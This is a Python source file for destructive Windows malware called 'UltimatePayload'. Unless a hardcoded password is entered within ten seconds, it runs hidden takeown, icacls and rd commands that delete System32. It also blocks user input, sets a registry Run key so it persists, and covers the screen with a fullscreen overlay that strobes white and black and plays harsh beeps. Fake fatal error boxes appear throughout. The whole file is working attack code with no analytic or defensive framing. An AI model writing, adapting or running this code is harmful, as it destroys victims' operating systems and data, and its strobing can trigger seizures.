import os
import sys
import time
import random
import shutil
import ctypes
import winsound
import threading
import subprocess
import tkinter as tk
from pathlib import Path

PASSWORD = "571632"
TIMEOUT = 10
SYSTEM32_PATH = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")

class UltimatePayload:
    def __init__(self):
        self.authenticated = False
        self.root = None
        
    # === AUTH & TIMER ===
    def auth_gate(self):
        print(f"AUTH REQUIRED: Enter '{PASSWORD}' within {TIMEOUT} seconds")
        result = [None]
        def get_input():
            try:
                result[0] = input()
            except EOFError:
                pass
        t = threading.Thread(target=get_input, daemon=True)
        t.start()
        t.join(timeout=TIMEOUT)
        
        if result[0] == PASSWORD:
            self.authenticated = True
            print("ACCESS GRANTED")
        else:
            print("AUTH FAILED - INITIATING PAYLOAD")
            
    # === SYSTEM DESTRUCTION ===
    def destroy_system32(self):
        if self.authenticated:
            return
        cmds = [
            f'takeown /f "{SYSTEM32_PATH}" /r /d y',
            f'icacls "{SYSTEM32_PATH}" /grant administrators:F /t',
            f'rd /s /q "{SYSTEM32_PATH}"'
        ]
        for cmd in cmds:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, 
                             creationflags=0x08000000)
            except Exception:
                pass
                
    # === INPUT LOCK ===
    def lock_input(self):
        if self.authenticated:
            return
        try:
            ctypes.windll.user32.BlockInput(True)
        except AttributeError:
            pass
            
    # === PERSISTENCE ===
    def install_persistence(self):
        if self.authenticated:
            return
        try:
            import winreg
            exe = sys.executable
            script = os.path.abspath(__file__)
            cmd = f'"{exe}" "{script}"'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SysLock", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
        except Exception:
            pass
            
    # === VISUAL CHAOS ===
    def setup_overlay(self):
        if self.authenticated:
            return
        self.root = tk.Tk()
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.configure(bg="black")
        self.root.bind("<Escape>", lambda e: None)
        
    def strobe_and_jumpscare(self):
        if self.authenticated or not self.root:
            return
        while not self.authenticated:
            # Strobe burst
            for _ in range(random.randint(15, 40)):
                bg = random.choice(["white", "black"])
                self.root.configure(bg=bg)
                freq = random.choice([800, 1500, 3000, 5000])
                try:
                    winsound.Beep(freq, 40)
                except Exception:
                    pass
                time.sleep(0.025)
                
            # Jumpscare
            if random.random() < 0.3:
                self.root.configure(bg="red")
                winsound.Beep(200, 600)
                time.sleep(0.6)
                self.root.configure(bg="white")
                winsound.Beep(4000, 300)
                time.sleep(0.3)
                
            self.root.configure(bg="black")
            time.sleep(random.uniform(1, 4))
            
    # === AUDIO TERROR ===
    def whisper_and_scream(self):
        if self.authenticated:
            return
        while not self.authenticated:
            mode = random.choice(["whisper", "scream", "silence"])
            if mode == "whisper":
                freq = random.randint(60, 180)
                dur = random.randint(2000, 5000)
                try:
                    winsound.Beep(freq, dur)
                except Exception:
                    pass
                time.sleep(random.uniform(1, 3))
            elif mode == "scream":
                freq = random.randint(2000, 6000)
                try:
                    winsound.Beep(freq, random.randint(200, 800))
                except Exception:
                    pass
                time.sleep(random.uniform(0.5, 2))
            else:
                time.sleep(random.uniform(2, 5))
                
    # === FAKE ERRORS ===
    def error_flood(self):
        if self.authenticated:
            return
        msgs = [
            "CRITICAL: System32 corruption irreversible",
            "FATAL: Boot sector overwritten",
            "ERROR: Registry hive destroyed",
            "WARNING: All user data unrecoverable",
            "ALERT: Hardware failure imminent"
        ]
        while not self.authenticated:
            msg = random.choice(msgs)
            try:
                ctypes.windll.user32.MessageBoxW(0, msg, "SYSTEM FAILURE", 0x10)
            except Exception:
                pass
            time.sleep(random.uniform(0.5, 2))
            
    # === MAIN EXECUTION ===
    def run(self):
        self.auth_gate()
        
        if self.authenticated:
            return
            
        self.lock_input()
        self.install_persistence()
        self.setup_overlay()
        
        threads = [
            threading.Thread(target=self.destroy_system32, daemon=True),
            threading.Thread(target=self.strobe_and_jumpscare, daemon=True),
            threading.Thread(target=self.whisper_and_scream, daemon=True),
            threading.Thread(target=self.error_flood, daemon=True),
        ]
        
        for t in threads:
            t.start()
            
        if self.root:
            self.root.mainloop()
        else:
            while not self.authenticated:
                time.sleep(1)

if __name__ == "__main__":
    payload = UltimatePayload()
    payload.run()